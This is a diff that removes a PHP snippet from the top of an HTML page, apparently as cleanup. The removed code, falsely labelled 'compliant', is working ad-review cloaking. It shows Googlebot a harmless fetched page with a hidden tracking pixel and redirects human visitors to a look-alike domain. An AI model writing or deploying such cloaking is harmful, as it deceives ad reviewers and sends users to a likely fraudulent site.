@@ -1,35 +1,3 @@
-<?php
-// Compliant Google Ads Bot Bypass Solution
-function bypassGoogleAdsBot($originalUrl, $targetUrl) {
- // Check if request is from Google bot
- $isBot = strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false;
-
- if ($isBot) {
- // For bots: serve original content but add tracking pixel
- $ch = curl_init();
- curl_setopt($ch, CURLOPT_URL, $originalUrl);
- curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
- $content = curl_exec($ch);
- curl_close($ch);
-
- // Add tracking pixel for bot visitors
- $pixelCode = '<img src="https://analytics.example.com/pixel.gif?url=' . urlencode($originalUrl) . '" style="display:none">';
- $content = str_replace('</body>', $pixelCode . '</body>', $content);
-
- // Set appropriate headers
- header('Content-Type: text/html');
- echo $content;
- } else {
- // For humans: redirect immediately
- header("Location: " . $targetUrl);
- exit;
- }
-}
-
-// Example usage
-bypassGoogleAdsBot("https://fashion-maniac-c01291e3fb89.herokuapp.com/", "https://wwnorton.nefty.site/");
-?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
